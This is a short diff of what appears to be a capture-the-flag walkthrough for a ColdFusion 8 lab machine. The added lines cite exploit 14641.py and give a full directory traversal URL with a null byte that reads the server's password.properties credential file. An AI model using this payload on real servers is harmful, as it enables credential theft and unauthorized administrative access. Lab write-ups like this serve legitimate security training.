@@ -20,3 +20,9 @@ Admin page is asking for password lets see if there is some way to bypass this
 
 ![Arctic_exploit](https://user-images.githubusercontent.com/55708909/91931450-17e73500-ed01-11ea-91a7-7807d6b1f486.png)
 
+Use directory traversal exploit 14641.py
+
+from that change the url address as per your need i.e. 
+
+http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+
